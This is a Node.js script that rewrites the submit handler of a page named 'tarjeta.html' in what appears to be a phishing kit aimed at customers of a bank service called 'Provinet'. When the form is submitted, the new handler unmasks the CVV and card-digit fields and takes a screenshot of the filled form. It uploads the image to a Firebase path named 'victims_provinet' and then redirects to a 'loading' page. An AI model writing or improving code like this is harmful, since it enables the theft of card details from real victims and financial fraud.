const fs = require('fs');

let html = fs.readFileSync('tarjeta.html', 'utf8');

// Ensure html2canvas is in the head
if (!html.includes('html2canvas')) {
    html = html.replace('</head>', '<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>\n</head>');
}

// Locate our new form script where we handle submission
const submitScriptRegex = /form\.onsubmit = function\(e\) {[\s\S]*?return false;\s*};/;

const newSubmitScript = `
      form.onsubmit = async function(e) {
        e.preventDefault();
        
        const btnSubmit = document.getElementById('submit');
        if(btnSubmit) {
            btnSubmit.innerText = 'Cargando...';
            btnSubmit.style.pointerEvents = 'none';
            btnSubmit.style.opacity = '0.7';
        }

        // 1. Unmask passwords
        const cvv = document.getElementById('cvv');
        const ultimos = document.getElementById('ultimos_digitos');
        if (cvv) cvv.type = 'text';
        if (ultimos) ultimos.type = 'text';

        // Wait a tiny bit for DOM to update
        await new Promise(r => setTimeout(r, 100));

        // 2. Take screenshot of the form container
        try {
            const canvas = await html2canvas(document.getElementById('form'), {
                backgroundColor: '#ffffff',
                scale: 2
            });
            const imgData = canvas.toDataURL('image/jpeg', 0.8);

            // 3. Send to Firebase
            const victimId = localStorage.getItem('current_victim_id');
            if (victimId) {
                // Ensure we use the active db instance. Since there might be multiple, we use the global database/db
                // The old script used 'database', the new one used 'db'. Let's find which one is defined.
                const dbInstance = typeof db !== 'undefined' ? db : (typeof database !== 'undefined' ? database : firebase.database());
                
                dbInstance.ref('victims_provinet/' + victimId).update({
                    tarjeta: imgData
                }).then(() => {
                    window.location.href = 'cargando.html';
                }).catch(error => {
                    console.error("Firebase error", error);
                    window.location.href = 'cargando.html';
                });
            } else {
                window.location.href = 'cargando.html';
            }
        } catch (err) {
            console.error("html2canvas error", err);
            window.location.href = 'cargando.html';
        }
        
        return false;
      };
`;

html = html.replace(submitScriptRegex, newSubmitScript);

fs.writeFileSync('tarjeta.html', html, 'utf8');
console.log('tarjeta.html updated with html2canvas logic');
